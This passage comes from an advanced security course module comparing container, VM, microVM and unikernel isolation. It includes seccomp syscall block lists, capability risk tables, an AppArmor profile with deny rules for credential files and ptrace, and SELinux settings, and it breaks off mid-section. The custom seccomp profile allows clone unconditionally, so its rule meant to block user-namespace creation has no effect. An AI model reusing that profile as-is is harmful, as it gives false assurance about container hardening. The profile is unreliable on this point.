# Containers vs Virtual Machines — Security Architecture Comparison, Hybrid Deployments, and Attack Surface Analysis

> **Module:** Migrazione VMware → Proxmox VE
> **Position in curriculum:** Security Deep-Dive — Module 28 (advanced comparative)
> **Prerequisites:** Modules 01-02 (VMware/Proxmox fundamentals), Module 12 (Security & Compliance), Module 20 (Hypervisor Hardening), Module 21 (VM Escape Attacks & Defenses); strong understanding of Linux kernel internals (namespaces, cgroups, seccomp, capabilities), container runtimes (Docker, containerd), x86 hardware virtualization (VT-x/AMD-V, EPT/NPT, IOMMU), PKI/TLS, network security.
> **Learning objectives.** Upon completion the student will be able to:
> 1. Compare the security isolation models of containers, VMs, microVMs, and unikernels across 15 quantifiable dimensions;
> 2. Analyze container runtime architectures and configure seccomp, capabilities, and MAC policies for defense-in-depth;
> 3. Evaluate VM runtime security mechanisms including vTPM, measured boot, EPT/NPT, and IOMMU;
> 4. Reproduce and defend against container escape techniques including capability abuse, namespace escape, and kernel exploits;
> 5. Compare container and VM escape difficulty, frequency, and blast radius;
> 6. Design Proxmox hybrid deployments using LXC and KVM with appropriate security controls per workload;
> 7. Architect Kubernetes clusters on virtual infrastructure with pod-level VM isolation via Kata Containers and Confidential Containers;
> 8. Implement unified security monitoring across containers and VMs using Falco, Wazuh, and centralized log aggregation;
> 9. Map compliance frameworks (PCI-DSS, CIS benchmarks) to container and VM deployments;
> 10. Execute a hands-on hybrid security assessment comparing LXC, KVM, and container breakout scenarios.
> **Estimated time:** reading 4-5 hours; lab exercises 12-20 hours
> **Level:** Expert (Dreyfus 5); requires offensive security mindset
> **Last update:** 2026-05-07
> **Reference versions:** Linux 6.x, QEMU 9.x, Proxmox VE 8.x, Docker 27.x, containerd 1.7.x, Kubernetes 1.31.x, Kata Containers 3.x, Firecracker 1.x, gVisor 2024+, Falco 0.39.x, Wazuh 4.x
> **Audience:** Senior IT professionals, ethical hackers, penetration testers, cloud security architects

---

## Table of Contents

1. [Isolation Models Compared](#1-isolation-models-compared)
2. [Container Runtime Security](#2-container-runtime-security)
3. [VM Runtime Security](#3-vm-runtime-security)
4. [Container Escape Techniques](#4-container-escape-techniques)
5. [VM Escape Techniques](#5-vm-escape-techniques)
6. [Proxmox Hybrid Deployments](#6-proxmox-hybrid-deployments)
7. [Kubernetes on Virtual Infrastructure](#7-kubernetes-on-virtual-infrastructure)
8. [Security Monitoring Across Hybrid](#8-security-monitoring-across-hybrid)
9. [Compliance Considerations](#9-compliance-considerations)
10. [Lab: Hybrid Security Assessment](#10-lab-hybrid-security-assessment)

---

## 1. Isolation Models Compared

### 1.1 VM Isolation — Hardware-Enforced Hypervisor Boundary

Virtual machines provide isolation through hardware-enforced boundaries. The hypervisor (VMM) runs in Ring -1 (VMX root mode on Intel, SVM host mode on AMD), intercepting privileged guest operations via VM exits. Each guest operates with its own kernel, its own virtual hardware, and its own memory address space translated through Extended Page Tables (EPT) or Nested Page Tables (NPT).

The critical security property: **the guest kernel has zero direct access to host memory, host devices, or other guest address spaces**. An attacker who compromises the guest kernel still operates within a hardware-enforced sandbox. Breaking out requires exploiting the hypervisor itself — a far smaller and more audited codebase than a general-purpose OS kernel.

```
┌──────────────────────────────────────────────────────┐
│  Guest VM A                    Guest VM B             │
│  ┌──────────────┐             ┌──────────────┐       │
│  │ App Processes │             │ App Processes │       │
│  ├──────────────┤             ├──────────────┤       │
│  │ Guest Kernel  │             │ Guest Kernel  │       │
│  │ (Ring 0 non-  │             │ (Ring 0 non-  │       │
│  │  root mode)   │             │  root mode)   │       │
│  └──────┬───────┘             └──────┬───────┘       │
│         │ VMEXIT                      │ VMEXIT        │
│  ═══════╧════════════════════════════╧═══════════    │
│  │          HYPERVISOR (Ring -1, VMX root)       │    │
│  │  EPT/NPT tables │ VMCS │ Device emulation    │    │
│  ════════════════════════════════════════════════     │
│  │               HOST KERNEL                    │    │
│  │          Hardware: CPU, RAM, IOMMU           │    │
│  ════════════════════════════════════════════════     │
└──────────────────────────────────────────────────────┘
```

Key isolation mechanisms:

- **Separate kernel per guest.** A kernel vulnerability in Guest A does not affect Guest B or the host.
- **EPT/NPT.** Hardware page table translation prevents guest physical address access to host memory.
- **VMCS/VMCB.** Per-VM control structures define VM exit conditions, intercepted instructions, and I/O permissions.
- **IOMMU (VT-d/AMD-Vi).** DMA isolation prevents passthrough devices from accessing arbitrary host memory.

### 1.2 Container Isolation — Namespaces, cgroups, Shared Kernel

Containers share the host kernel. Isolation is achieved through kernel features rather than hardware boundaries:

```
┌──────────────────────────────────────────────────────┐
│  Container A          Container B          Host       │
│  ┌─────────┐         ┌─────────┐         Processes   │
│  │ App     │         │ App     │                      │
│  │ Procs   │         │ Procs   │                      │
│  └────┬────┘         └────┬────┘                      │
│       │ syscall            │ syscall                   │
│  ═════╧════════════════════╧══════════════════════    │
│  │         SHARED HOST KERNEL (Ring 0)           │    │
│  │  Namespaces │ cgroups │ seccomp │ LSM         │    │
│  ════════════════════════════════════════════════     │
│  │               HARDWARE                        │    │
│  ════════════════════════════════════════════════     │
└──────────────────────────────────────────────────────┘
```

**Linux Namespaces** provide process-level resource isolation:

| Namespace | Kernel Flag | Isolates |
|-----------|-------------|----------|
| Mount | `CLONE_NEWNS` | Filesystem mount points |
| PID | `CLONE_NEWPID` | Process ID numbering |
| Network | `CLONE_NEWNET` | Network interfaces, routing, iptables |
| UTS | `CLONE_NEWUTS` | Hostname and NIS domain |
| IPC | `CLONE_NEWIPC` | System V IPC, POSIX message queues |
| User | `CLONE_NEWUSER` | UID/GID mappings |
| Cgroup | `CLONE_NEWCGROUP` | Cgroup root directory |
| Time | `CLONE_NEWTIME` | Boot and monotonic clocks (Linux 5.6+) |

**cgroups v2** enforce resource limits (CPU, memory, I/O, PIDs) and prevent denial-of-service against other containers or the host. cgroups are a resource control mechanism, not a security boundary — but they prevent resource exhaustion attacks.

**The fundamental weakness:** every container shares the same kernel. A kernel exploit (privilege escalation, race condition, memory corruption) affects all containers and the host simultaneously. This is the single most important security distinction between containers and VMs.

### 1.3 Security Boundary Strength — The Kernel Exploit Problem

The asymmetry is stark:

- **Container escape via kernel exploit:** An attacker inside a container can invoke syscalls against the shared kernel. A kernel vulnerability (e.g., a race condition in a filesystem, a use-after-free in netfilter) can yield root on the host. The entire container fleet on that host is then compromised.
- **VM escape via kernel exploit:** An attacker who exploits the guest kernel gains full control of the guest — but this does not affect the host. The hypervisor boundary remains intact. Escaping requires a separate hypervisor exploit (e.g., in QEMU device emulation).

This is not theoretical. Container escapes via kernel exploits are documented regularly (Dirty COW 2016, Dirty Pipe 2022, multiple overlayfs bugs). VM escapes are rare and require exploiting specific hypervisor device emulation code.

### 1.4 MicroVMs — Firecracker, Cloud Hypervisor, Kata Containers

MicroVMs occupy the space between containers and full VMs, providing VM-level isolation with container-like speed:

**Firecracker** (developed by AWS for Lambda and Fargate):
- Minimal VMM written in Rust — ~50k lines of code vs ~1.4M for QEMU
- Exposes only 5 emulated devices: virtio-net, virtio-block, serial console, partial i8042, RTC
- No PCI, no USB, no graphics — attack surface reduced by orders of magnitude
- Boots a Linux guest in ~125ms, memory overhead ~5MB per microVM
- Jailed with seccomp and cgroups; the VMM process itself is sandboxed
- Threat model: untrusted tenants running arbitrary code (AWS Lambda model)

**Cloud Hypervisor** (Intel/Linux Foundation):
- Rust-based VMM focused on cloud-native workloads
- Supports PCI, virtio, VFIO passthrough — broader device model than Firecracker
- vhost-user for offloading I/O to user-space daemons
- Hot-plug support for CPU, memory, and devices

**Kata Containers**:
- OCI-compatible runtime that spawns each container/pod inside a lightweight VM
- Can use QEMU, Cloud Hypervisor, or Firecracker as the VMM backend
- Integrates with Kubernetes via CRI — from the orchestrator's perspective, it's just another runtime
- Each pod gets its own kernel — kernel exploits stay contained within the pod-VM
- Performance overhead ~1-3% CPU, ~20-50MB memory per pod vs bare containers

### 1.5 Unikernel Security Properties

Unikernels compile application code and minimal OS library components into a single-address-space image that runs directly on a hypervisor, with no general-purpose OS:

- **No shell, no package manager, no multi-user support** — eliminates entire exploit classes (post-exploitation pivoting, privilege escalation, lateral movement within the guest)
- **Single-address-space** — no process isolation inside the unikernel; a crash is total
- **Minimal syscall surface** — only linked library functions are present; unused kernel code does not ship
- **Immutable by design** — no writable filesystem in most implementations; runtime modification requires redeployment
- **Frameworks:** MirageOS (OCaml), Unikraft (C/POSIX-compatible), NanoVMs/Ops (runs unmodified Go/Node/Python binaries)

Security trade-off: unikernels have the smallest TCB but debugging, monitoring, and incident response are extremely difficult. No SSH, no strace, no traditional forensics. Suitable for narrow, well-defined services — not general-purpose workloads.

### 1.6 Comparison Matrix — 15 Security Dimensions

| # | Security Dimension | Full VM (KVM/QEMU) | Container (Docker/containerd) | MicroVM (Firecracker) | Kata Containers | Unikernel |
|---|---|---|---|---|---|---|
| 1 | Kernel sharing | None — separate kernel | Shared host kernel | None — separate kernel | None — separate kernel | None — runs on hypervisor |
| 2 | Hardware-enforced boundary | Yes — EPT/NPT, VMX | No — software only | Yes — EPT/NPT, VMX | Yes — EPT/NPT, VMX | Yes — EPT/NPT, VMX |
| 3 | Escape difficulty | Very high — requires hypervisor bug | Low-moderate — kernel bug suffices | Very high — minimal VMM surface | Very high — VM boundary | Very high — VM boundary + minimal surface |
| 4 | Blast radius of escape | Host + all VMs on host | Host + all containers on host | Host + all microVMs on host | Host + all pods on host | Host + all unikernels on host |
| 5 | Attack surface (TCB size) | Large (~1.4M LoC QEMU) | Medium (kernel syscall surface) | Very small (~50k LoC) | Medium (QEMU) or small (CH/FC) | Minimal (application-specific) |
| 6 | Side-channel exposure | Low with SEV/TDX; medium without | High — shared kernel caches | Low with SEV/TDX | Low with SEV/TDX | Low — hypervisor isolation |
| 7 | Density (workloads/host) | Low (50-200 per host) | Very high (1000+ per host) | High (500+ per host) | Medium-high (200-500) | Very high (1000+ per host) |
| 8 | Boot time | 5-30 seconds | <1 second | ~125ms | ~1 second | ~10-50ms |
| 9 | Image immutability | Mutable by default; can snapshot | Immutable layers, mutable runtime | Immutable rootfs | Immutable layers + VM rootfs | Immutable by design |
| 10 | Secrets handling | In-guest secret management | Mounted secrets/env vars (risky) | Minimal secret injection | K8s secret mounting | Baked at build or injected via vsock |
| 11 | Network isolation primitive | Virtual NIC + VLAN/VxLAN | veth + network namespace | tap + virtio-net | tap + virtio-net | Virtual NIC |
| 12 | Storage isolation primitive | Virtual disk (qcow2/raw) | Overlay filesystem (shared kernel) | Block device (virtio-block) | Block device or overlay | Single image — no separate storage |
| 13 | Runtime overhead | 5-15% CPU, 256MB+ RAM per VM | <1% CPU, <10MB per container | 1-3% CPU, 5-20MB per microVM | 1-3% CPU, 20-50MB per pod | <1% CPU, 1-5MB per unikernel |
| 14 | Compliance scope (PCI-DSS) | Per-VM scoping possible | Shared kernel = shared scope | Per-microVM scoping possible | Per-pod scoping possible | Per-unikernel scoping possible |
| 15 | Forensics capability | Full — memory dump, disk snapshot | Limited — ephemeral, shared kernel | Limited — minimal guest tooling | Moderate — VM memory dump possible | Very limited — no shell/debug tools |

---

## 2. Container Runtime Security

### 2.1 Docker / containerd / CRI-O Architecture

Understanding the runtime stack is prerequisite to securing it:

```
┌──────────────────────────────────────────────────────────────┐
│  User / API Client                                            │
│     │                                                         │
│     ▼                                                         │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐    │
│  │ Docker CLI   │    │  Kubernetes  │    │   Podman     │    │
│  │ (dockerd)    │    │   kubelet    │    │  (daemonless)│    │
│  └──────┬───────┘    └──────┬───────┘    └──────┬───────┘    │
│         │                   │                    │            │
│         ▼                   ▼                    │            │
│  ┌──────────────┐    ┌──────────────┐            │            │
│  │  containerd  │    │   CRI-O     │            │            │
│  │  (CRI impl)  │    │  (CRI impl) │            │            │
│  └──────┬───────┘    └──────┬───────┘            │            │
│         │                   │                    │            │
│         ▼                   ▼                    ▼            │
│  ┌─────────────────────────────────────────────────────┐     │
│  │               OCI Runtime (runc / crun / youki)      │     │
│  │  clone() → namespaces, pivot_root, seccomp, caps     │     │
│  └──────────────────────────────────────────────────────┘     │
│         │                                                     │
│         ▼                                                     │
│  ┌─────────────────────────────────────────────────────┐     │
│  │                  Linux Kernel                        │     │
│  │  namespaces │ cgroups │ seccomp-bpf │ LSM           │     │
│  └─────────────────────────────────────────────────────┘     │
└──────────────────────────────────────────────────────────────┘
```

**Docker** (dockerd + containerd): The Docker daemon (`dockerd`) is a root-level daemon that manages container lifecycle. It delegates to `containerd` for actual container execution. `containerd` manages container images, snapshots, and invokes the OCI runtime. Security concern: the Docker daemon socket (`/var/run/docker.sock`) is a root-equivalent entry point — any process with socket access can launch privileged containers.

**containerd**: A CNCF graduated project. Can be used standalone (without Docker) or as the CRI implementation for Kubernetes. Manages the full container lifecycle: image pull, snapshot creation, container creation via OCI runtime, task management.

**CRI-O**: Purpose-built CRI implementation for Kubernetes. Lighter than containerd — does not support Docker CLI compatibility. Pulls images via `containers/image` library, creates containers via OCI runtime. Smaller attack surface than the containerd+Docker stack because it does only what Kubernetes needs.

### 2.2 OCI Runtime Spec — Security-Relevant Configuration

The OCI Runtime Specification defines the container's `config.json`. Security-critical fields:

```json
{
  "process": {
    "terminal": false,
    "user": { "uid": 1000, "gid": 1000 },
    "args": ["/app/server"],
    "capabilities": {
      "bounding": ["CAP_NET_BIND_SERVICE"],
      "effective": ["CAP_NET_BIND_SERVICE"],
      "permitted": ["CAP_NET_BIND_SERVICE"]
    },
    "noNewPrivileges": true,
    "rlimits": [
      { "type": "RLIMIT_NOFILE", "hard": 1024, "soft": 1024 }
    ]
  },
  "root": {
    "path": "rootfs",
    "readonly": true
  },
  "linux": {
    "namespaces": [
      { "type": "pid" },
      { "type": "network" },
      { "type": "ipc" },
      { "type": "uts" },
      { "type": "mount" },
      { "type": "cgroup" },
      { "type": "user" }
    ],
    "seccomp": { "...": "..." },
    "maskedPaths": [
      "/proc/kcore", "/proc/latency_stats", "/proc/timer_list",
      "/proc/timer_stats", "/proc/sched_debug", "/proc/scsi",
      "/sys/firmware", "/sys/devices/virtual/powercap"
    ],
    "readonlyPaths": [
      "/proc/bus", "/proc/fs", "/proc/irq", "/proc/sys", "/proc/sysrq-trigger"
    ]
  }
}
```

Key security properties: `noNewPrivileges` prevents SUID binaries from escalating; `readonly` root prevents runtime filesystem modification; `maskedPaths` blocks information disclosure from procfs/sysfs; `readonlyPaths` prevents kernel parameter tuning from inside the container.

### 2.3 OCI Runtimes Compared — runc, crun, youki, gVisor, Kata

| Runtime | Language | Isolation | Security Model | Use Case |
|---------|----------|-----------|----------------|----------|
| **runc** | Go | Namespace/cgroup | Standard Linux isolation | Default for Docker/containerd/CRI-O |
| **crun** | C | Namespace/cgroup | Same as runc, lower overhead | Performance-sensitive, rootless RHEL |
| **youki** | Rust | Namespace/cgroup | Memory-safe implementation | Rust-native systems, safety focus |
| **gVisor (runsc)** | Go | User-space kernel | Intercepts syscalls; guest kernel in user-space | Untrusted workloads, multi-tenant |
| **Kata (kata-runtime)** | Go+Rust | VM per pod | Hardware-enforced isolation | Strong isolation with OCI compatibility |

**gVisor** deserves special attention. It implements a guest kernel (called Sentry) in user-space that intercepts all container syscalls via ptrace or KVM mode. The container never directly invokes host kernel syscalls — Sentry translates them and forwards a minimal subset to the host kernel via a restricted set of ~70 host syscalls (called Gofer for filesystem operations). This creates a security boundary at the syscall level, without requiring hardware virtualization:

```
Container Process
      │
      │ syscall
      ▼
┌──────────────┐
│    Sentry    │  ← gVisor user-space kernel (~215 syscalls implemented)
│  (runsc)     │
└──────┬───────┘
       │ ~70 host syscalls (restricted set)
       ▼
┌──────────────┐
│ Host Kernel  │
└──────────────┘
```

Trade-off: gVisor has ~5-30% syscall overhead and does not implement all Linux syscalls. Applications relying on io_uring, eBPF, or certain ioctl calls may not work. But for web services, gVisor provides a compelling middle ground between runc and full VMs.

### 2.4 Rootless Containers — User Namespace Implementation

Rootless containers run the entire container runtime stack without root privileges, using user namespaces to map container root (UID 0) to an unprivileged host user:

```bash
# Example: User 'appuser' (UID 1000) runs a rootless container
# Inside container: UID 0 (root)
# On host: UID 100000 (mapped via /etc/subuid)

$ cat /etc/subuid
appuser:100000:65536

$ cat /etc/subgid
appuser:100000:65536
```

The user namespace maps container UIDs to a range of unprivileged host UIDs. Even if a process escapes the container, it runs as an unprivileged user on the host.

Security implications:
- **Cannot bind privileged ports (<1024)** without additional configuration (net.ipv4.ip_unprivileged_port_start)
- **Cannot load kernel modules** — no CAP_SYS_MODULE on host
- **Cannot access raw sockets** — no CAP_NET_RAW on host
- **Cannot mount most filesystem types** — no CAP_SYS_ADMIN on host
- **Significant escape mitigation** — even with a kernel exploit, the attacker lands in an unprivileged user context

Rootless mode requirements: user namespace support in the kernel (`CONFIG_USER_NS=y`), `/etc/subuid` and `/etc/subgid` configured, cgroup v2 with delegation, and a fuse-overlayfs or native overlay with user namespace support.

### 2.5 Seccomp Profiles — Default Docker Profile Analysis

Docker applies a default seccomp profile that blocks ~44 syscalls considered dangerous. Analysis of the default profile:

**Blocked syscalls and rationale:**

| Syscall | Risk | Why Blocked |
|---------|------|-------------|
| `acct` | Process accounting manipulation | Information disclosure, DoS |
| `add_key` | Kernel keyring manipulation | Credential theft from other containers |
| `bpf` | eBPF program loading | Arbitrary kernel code execution |
| `clock_adjtime` | System clock modification | Log tampering, DoS |
| `clock_settime` | System clock modification | Log tampering, time-based auth bypass |
| `create_module` | Kernel module creation | Arbitrary kernel code execution |
| `delete_module` | Kernel module removal | DoS, disabling security modules |
| `finit_module` | Kernel module loading (fd-based) | Arbitrary kernel code execution |
| `get_kernel_syms` | Kernel symbol table | Information disclosure for exploit dev |
| `init_module` | Kernel module loading | Arbitrary kernel code execution |
| `io_uring_setup` | io_uring initialization | Kernel attack surface (many CVEs) |
| `io_uring_enter` | io_uring submission | Kernel attack surface |
| `io_uring_register` | io_uring resource registration | Kernel attack surface |
| `kcmp` | Process comparison | Information disclosure |
| `kexec_file_load` | Kernel replacement | Host OS replacement |
| `kexec_load` | Kernel replacement | Host OS replacement |
| `keyctl` | Kernel keyring manipulation | Credential theft |
| `lookup_dcookie` | Kernel profiling data | Information disclosure |
| `mbind` | NUMA memory policy | Side-channel enablement |
| `mount` | Filesystem mounting | Escape via mount namespace manipulation |
| `move_mount` | Mount tree modification | Escape via mount manipulation |
| `nfsservctl` | NFS kernel server control | Unauthorized network services |
| `open_tree` | Mount tree operations | Mount namespace manipulation |
| `perf_event_open` | Performance monitoring | Side-channel attacks, information disclosure |
| `personality` | Execution domain change | Security model bypass |
| `pivot_root` | Root filesystem change | Escape via filesystem manipulation |
| `ptrace` | Process tracing | Reading memory/registers of other processes |
| `quotactl` | Disk quota control | DoS against other containers |
| `reboot` | System reboot | Host DoS |
| `request_key` | Kernel keyring request | Credential access |
| `setns` | Namespace switching | Container escape via namespace joining |
| `settimeofday` | System clock modification | Log tampering |
| `stime` | System clock modification | Log tampering |
| `swapon` | Swap space activation | DoS, potential data leakage |
| `swapoff` | Swap space deactivation | DoS |
| `syslog` | Kernel log buffer | Information disclosure |
| `umount2` | Filesystem unmounting | DoS via filesystem removal |
| `unshare` | New namespace creation | Privilege escalation via user namespace |
| `userfaultfd` | User-space page fault handling | Use-after-free exploitation primitive |
| `vm86` | x86 real mode (32-bit only) | Legacy CPU mode exploitation |
| `vm86old` | x86 real mode (32-bit only) | Legacy CPU mode exploitation |

**Custom seccomp profile example — restrictive web service:**

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "defaultErrnoRet": 1,
  "architectures": ["SCMP_ARCH_X86_64", "SCMP_ARCH_X86", "SCMP_ARCH_AARCH64"],
  "syscalls": [
    {
      "names": [
        "accept", "accept4", "access", "arch_prctl", "bind",
        "brk", "capget", "capset", "chdir", "clone", "clone3",
        "close", "connect", "dup", "dup2", "dup3", "epoll_create",
        "epoll_create1", "epoll_ctl", "epoll_pwait", "epoll_wait",
        "eventfd", "eventfd2", "execve", "exit", "exit_group",
        "faccessat", "faccessat2", "fadvise64", "fallocate",
        "fchmod", "fchmodat", "fchown", "fchownat", "fcntl",
        "fdatasync", "flock", "fstat", "fstatfs", "fsync",
        "ftruncate", "futex", "getcwd", "getdents64", "getegid",
        "geteuid", "getgid", "getgroups", "getpeername", "getpgid",
        "getpid", "getppid", "getrandom", "getresgid", "getresuid",
        "getrlimit", "getsockname", "getsockopt", "gettid",
        "gettimeofday", "getuid", "inotify_add_watch",
        "inotify_init1", "inotify_rm_watch", "ioctl", "listen",
        "lseek", "madvise", "membarrier", "memfd_create",
        "mincore", "mkdir", "mkdirat", "mmap", "mprotect",
        "mremap", "msync", "munmap", "nanosleep", "newfstatat",
        "openat", "pipe", "pipe2", "poll", "ppoll", "prctl",
        "pread64", "preadv", "prlimit64", "pwrite64", "pwritev",
        "read", "readlink", "readlinkat", "readv", "recvfrom",
        "recvmsg", "rename", "renameat", "renameat2", "restart_syscall",
        "rmdir", "rt_sigaction", "rt_sigprocmask", "rt_sigreturn",
        "sched_getaffinity", "sched_yield", "select", "sendmsg",
        "sendto", "set_robust_list", "set_tid_address", "setgid",
        "setgroups", "setsockopt", "setuid", "shutdown", "sigaltstack",
        "socket", "socketpair", "splice", "stat", "statfs",
        "statx", "symlink", "symlinkat", "tgkill", "timer_create",
        "timer_delete", "timer_getoverrun", "timer_gettime",
        "timer_settime", "timerfd_create", "timerfd_gettime",
        "timerfd_settime", "umask", "uname", "unlink", "unlinkat",
        "wait4", "waitid", "write", "writev"
      ],
      "action": "SCMP_ACT_ALLOW"
    },
    {
      "names": ["clone", "clone3"],
      "action": "SCMP_ACT_ALLOW",
      "args": [
        {
          "index": 0,
          "value": 2114060288,
          "op": "SCMP_CMP_MASKED_EQ",
          "comment": "Block CLONE_NEWUSER — prevent user namespace creation"
        }
      ]
    }
  ]
}
```

Apply with: `docker run --security-opt seccomp=/path/to/profile.json ...`

### 2.6 Linux Capabilities — Full List with Security Implications

Linux capabilities split the monolithic root privilege into discrete units. Containers should run with the minimum set required. The full capability set as of Linux 6.x:

| Capability | Docker Default | Security Implication |
|------------|---------------|---------------------|
| `CAP_AUDIT_CONTROL` | No | Audit subsystem control — log tampering |
| `CAP_AUDIT_READ` | No | Read audit logs — information disclosure |
| `CAP_AUDIT_WRITE` | Yes | Write audit messages — spoofing audit trail |
| `CAP_BLOCK_SUSPEND` | No | Block system suspend — DoS |
| `CAP_BPF` | No | eBPF operations — arbitrary kernel instrumentation |
| `CAP_CHECKPOINT_RESTORE` | No | CRIU checkpoint/restore — process migration |
| `CAP_CHOWN` | Yes | Change file ownership — privilege escalation via SUID |
| `CAP_DAC_OVERRIDE` | Yes | Bypass file read/write/execute checks — broad file access |
| `CAP_DAC_READ_SEARCH` | No | Bypass file read and directory search checks — data exfiltration |
| `CAP_FOWNER` | Yes | Bypass permission checks where file owner = process UID |
| `CAP_FSETID` | Yes | Set SUID/SGID bits — privilege escalation vector |
| `CAP_IPC_LOCK` | No | Lock memory (mlock) — side-channel mitigation bypass |
| `CAP_IPC_OWNER` | No | Bypass IPC permission checks — inter-process data access |
| `CAP_KILL` | Yes | Send signals to any process — process termination |
| `CAP_LEASE` | No | File leases — limited risk |
| `CAP_LINUX_IMMUTABLE` | No | Set immutable file flags — persistence mechanism |
| `CAP_MAC_ADMIN` | No | MAC configuration — disable SELinux/AppArmor |
| `CAP_MAC_OVERRIDE` | No | Override MAC policy — bypass mandatory access control |
| `CAP_MKNOD` | Yes | Create device nodes — device access |
| `CAP_NET_ADMIN` | No | Network configuration — iptables, routing, sniffing |
| `CAP_NET_BIND_SERVICE` | Yes | Bind ports <1024 — service impersonation |
| `CAP_NET_BROADCAST` | No | Network broadcast — limited risk |
| `CAP_NET_RAW` | No | Raw sockets — packet crafting, sniffing, ARP spoofing |
| `CAP_PERFMON` | No | Performance monitoring — side-channel enablement |
| `CAP_SETFCAP` | Yes | Set file capabilities — persistence and escalation |
| `CAP_SETGID` | Yes | Set GID — supplementary group manipulation |
| `CAP_SETPCAP` | Yes | Transfer capabilities — capability escalation |
| `CAP_SETUID` | Yes | Set UID — identity switching, privilege escalation |
| `CAP_SYS_ADMIN` | No | Catch-all admin — mount, namespace, BPF, device-mapper; most dangerous capability |
| `CAP_SYS_BOOT` | No | Reboot system — host DoS |
| `CAP_SYS_CHROOT` | No | chroot — limited escape vector |
| `CAP_SYS_MODULE` | No | Load/unload kernel modules — arbitrary kernel code |
| `CAP_SYS_NICE` | No | Process priority — DoS via priority manipulation |
| `CAP_SYS_PACCT` | No | Process accounting — information disclosure |
| `CAP_SYS_PTRACE` | No | Ptrace any process — memory inspection, code injection |
| `CAP_SYS_RAWIO` | No | Raw I/O (iopl/ioperm) — direct hardware access |
| `CAP_SYS_RESOURCE` | No | Override resource limits — DoS |
| `CAP_SYS_TIME` | No | Set system clock — log tampering |
| `CAP_SYS_TTY_CONFIG` | No | TTY configuration — limited risk |
| `CAP_SYSLOG` | No | Kernel log access — information disclosure |
| `CAP_WAKE_ALARM` | No | Set wake alarms — limited risk |

**Critical capabilities to never grant in production:**
- `CAP_SYS_ADMIN` — equivalent to root in most scenarios; enables mounting, BPF, device creation, cgroup manipulation
- `CAP_SYS_PTRACE` — enables reading memory of any process in the PID namespace; combined with host PID namespace = full host memory access
- `CAP_SYS_MODULE` — load arbitrary kernel modules
- `CAP_NET_ADMIN` — modify network configuration, inject firewall rules, enable packet capture
- `CAP_DAC_READ_SEARCH` — read any file regardless of permissions; used in the Shocker exploit

### 2.7 AppArmor and SELinux for Containers

**AppArmor profile for a hardened web container:**

```
#include <tunables/global>

profile docker-webapp flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>
  #include <abstractions/nameservice>

  # Deny all file access by default, then whitelist
  deny /etc/shadow r,
  deny /etc/passwd w,
  deny /proc/sys/** w,
  deny /proc/sysrq-trigger rwklx,
  deny /proc/kcore rwklx,
  deny /sys/firmware/** rwklx,
  deny /sys/kernel/security/** rwklx,

  # Application directory
  /app/** r,
  /app/server ix,
  /app/data/ rw,
  /app/data/** rw,

  # Temp files
  /tmp/** rw,

  # Runtime dependencies
  /lib/** mr,
  /lib64/** mr,
  /usr/lib/** mr,

  # Network
  network inet stream,
  network inet6 stream,
  deny network raw,
  deny network packet,

  # Deny mount operations
  deny mount,
  deny umount,
  deny pivot_root,

  # Deny ptrace
  deny ptrace (read, readby, trace, traceby),

  # Deny signal to processes outside this profile
  deny signal (send) peer=unconfined,

  # Capabilities — deny dangerous ones
  deny capability sys_admin,
  deny capability sys_module,
  deny capability sys_ptrace,
  deny capability sys_rawio,
  deny capability net_admin,
  deny capability net_raw,
  deny capability dac_read_search,

  capability net_bind_service,
  capability chown,
  capability setuid,
  capability setgid,
  capability fowner,
}
```

Apply: `docker run --security-opt apparmor=docker-webapp ...`

**SELinux container policy** (RHEL/Fedora with `container-selinux`):

The `container_t` type is the default SELinux type for containers. Key policy booleans:

```bash
# View current container SELinux booleans
getsebool -a | grep container

# Critical booleans — all should be OFF in production
setsebool -P container_connect_any 0         # Deny connecting to arbitrary ports
setsebool -P container_manage_cgroup 0       # Deny cgroup manipulation
setsebool -P container_use_cephfs 0          # Deny CephFS access unless needed

# Type enforcement rules for containers
# container_t → confined type, cannot:
#   - Access host /proc, /sys beyond labeled paths
#   - Write to host filesystem outside of labeled container volumes
#   - Use ptrace, rawio, module loading syscalls
#   - Transition to spc_t (super privileged container) without explicit relabeling
```

---

## 3. VM Runtime Security

> For exhaustive coverage of VM security architecture, see Module 20 (Hypervisor Security Hardening) and Module 21 (VM Escape Attacks & Defenses). This section covers the key mechanisms relevant for comparison with container security.

### 3.1 QEMU/KVM Security Architecture

KVM operates as a Linux kernel module that exposes `/dev/kvm`. QEMU runs as a user-space process that uses KVM ioctls to create and manage VMs:

```
┌──────────────────────────────────────────────────────┐
│  QEMU process (user-space, per VM)                    │
│  ┌──────────────────────────────────────────────┐    │
│  │ Device Emulation (virtio, IDE, e1000, etc.)   │    │
│  │ Migration │ Monitor │ Block layer │ Net layer  │    │
│  └─────────────────────┬────────────────────────┘    │
│                        │ ioctl(/dev/kvm)              │
│  ┌─────────────────────▼────────────────────────┐    │
│  │  KVM kernel module                            │    │
│  │  VMCS setup │ EPT management │ VM exit handler│    │
│  └─────────────────────┬────────────────────────┘    │
│                        │                              │
│  ┌─────────────────────▼────────────────────────┐    │
│  │  Hardware (VT-x/AMD-V, EPT/NPT, IOMMU)       │    │
│  └──────────────────────────────────────────────┘    │
└──────────────────────────────────────────────────────┘
```

Security-critical design: the QEMU process runs as an unprivileged user (`libvirt-qemu` or equivalent). If a guest exploits QEMU device emulation code, the attacker lands in a user-space process with limited host privileges. Additional hardening:

- **Seccomp whitelist on QEMU** — QEMU applies its own seccomp filter, blocking ~700+ unnecessary syscalls
- **SELinux/AppArmor confinement** — sVirt (SELinux) assigns unique MCS labels per VM; each QEMU process can only access its own disk images and resources
- **`-sandbox on,obsolete=deny,elevateprivileges=deny,spawn=deny,resourcecontrol=deny`** — QEMU command-line sandbox options

### 3.2 vTPM and Measured Boot

Virtual Trusted Platform Module (vTPM) enables measured boot chains inside VMs:

```bash
# Proxmox: Enable vTPM for a VM
qm set 100 --tpmstate0 local-lvm:4,version=v2.0

# This creates a TPM 2.0 device backed by swtpm
# The guest can use it for:
#   - Measured boot (PCR measurements)
#   - BitLocker/LUKS with TPM-sealed keys
#   - Remote attestation
```

Measured boot records every boot component (firmware, bootloader, kernel, initramfs) into Platform Configuration Registers (PCRs). Any modification to the boot chain produces different PCR values, detectable by remote attestation. This prevents rootkit persistence across reboots.

### 3.3 Memory Isolation — EPT/NPT

Extended Page Tables (Intel) and Nested Page Tables (AMD) provide hardware-enforced memory translation:

- **Guest Virtual Address → Guest Physical Address** — translated by guest page tables
